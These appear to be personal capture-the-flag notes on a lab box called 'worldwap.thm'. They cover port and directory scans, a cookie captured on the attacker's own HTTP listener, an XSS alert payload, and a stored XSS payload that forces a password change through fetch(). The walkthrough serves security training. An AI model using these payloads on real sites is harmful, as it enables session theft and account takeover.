# Enumeration

## Nmap

```bash
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
8081/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## SSH (22)

- Password authen is enable.

```bash
root@ip-10-10-177-188:~# ssh root@worldwap.thm
The authenticity of host 'worldwap.thm (10.10.212.193)' can't be established.
ECDSA key fingerprint is SHA256:lxthyLGSYAX2dtxPWVAhzHwn3iOtpwjL2Enj4NLpF7Q.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'worldwap.thm,10.10.212.193' (ECDSA) to the list of known hosts.
root@worldwap.thm's password: 
```

## HTTP(80)

### Dirsearch

```bash
[16:04:22] 301 -  310B  - /api  ->  http://worldwap.thm/api/
[16:04:22] 200 -    0B  - /api/
[16:04:43] 301 -  317B  - /javascript  ->  http://worldwap.thm/javascript/
[16:04:47] 200 -    0B  - /logs.txt
[16:04:57] 301 -  317B  - /phpmyadmin  ->  http://worldwap.thm/phpmyadmin/
[16:04:59] 200 -    3KB - /phpmyadmin/doc/html/index.html
[16:05:01] 200 -    3KB - /phpmyadmin/index.php
[16:05:01] 200 -    3KB - /phpmyadmin/
[16:05:02] 301 -  313B  - /public  ->  http://worldwap.thm/public/
[16:05:03] 200 -  490B  - /public/
```

### Vhost

- Nothing is interesting

### Website Features

![image.png](attachment:17b3ebe3-5163-42b3-a130-7518bdc7b629:image.png)

```bash
http://login.worldwap.thm/
```

### Dirsearch ( http://login.worldwap.thm/ )

```bash
[16:33:38] 301 -  330B  - /__pycache__  ->  http://login.worldwap.thm/__pycache__/
[16:33:40] 200 -    5KB - /admin.py
[16:33:47] 200 -  639B  - /assets/
[16:33:47] 301 -  325B  - /assets  ->  http://login.worldwap.thm/assets/
[16:33:51] 302 -    0B  - /chat.php  ->  login.php
[16:33:55] 200 -    0B  - /db.php
[16:34:04] 301 -  329B  - /javascript  ->  http://login.worldwap.thm/javascript/
[16:34:06] 200 -  960B  - /login.php
[16:34:06] 302 -    0B  - /logout.php  ->  login.php
[16:34:06] 200 -    0B  - /logs.txt
[16:34:13] 301 -  329B  - /phpmyadmin  ->  http://login.worldwap.thm/phpmyadmin/
[16:34:14] 200 -    3KB - /phpmyadmin/doc/html/index.html
[16:34:14] 200 -    3KB - /phpmyadmin/
[16:34:14] 200 -    3KB - /phpmyadmin/index.php
[16:34:16] 302 -    0B  - /profile.php  ->  login.php
[16:34:19] 403 -  283B  - /server-status
[16:34:19] 403 -  283B  - /server-status/
[16:34:20] 200 -   96B  - /setup.php

```

![image.png](attachment:eb3ca058-fa93-4c9b-881a-c10498c8541e:image.png)

- use javascript payload to collect cookie

```bash
root@ip-10-10-177-188:~# python3.9 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.212.193 - - [15/May/2025 16:28:03] "GET /?cookie=PHPSESSID=n0rl3obdguracs47ajh032h276 HTTP/1.1" 200 -
10.10.212.193 - - [15/May/2025 16:28:03] "GET /?cookie1=UEhQU0VTU0lEPW4wcmwzb2JkZ3VyYWNzNDdhamgwMzJoMjc2 HTTP/1.1" 200 -
                                                        (PHPSESSID=n0rl3obdguracs47ajh032h276)
```

![image.png](attachment:d63ec83f-12fb-4fe1-8428-60a3f27c7598:image.png)

### 

![image.png](attachment:689fc756-d8cd-496f-9d6f-09c9f0c0e865:image.png)

![image.png](attachment:e120960d-26bd-4db8-a164-02614912c65d:image.png)

![image.png](attachment:76f0b903-e39d-4b98-8c89-6b0dfdc91325:image.png)

- XXS

```bash
<script>alert(document.cookie)</script>
```

```bash
<script>fetch('change_password.php',{method:'POST',headers:{'Content-Type':'application/x-wwwform-urlencoded'},body:"new_password=newPass"});</script>
```

- use this script  in the chat

![image.png](attachment:8580e18b-2c69-49d0-9cea-97a45d13f21a:image.png)

![image.png](attachment:f9a5aec6-0e83-4a0e-a78d-e28210498065:image.png)
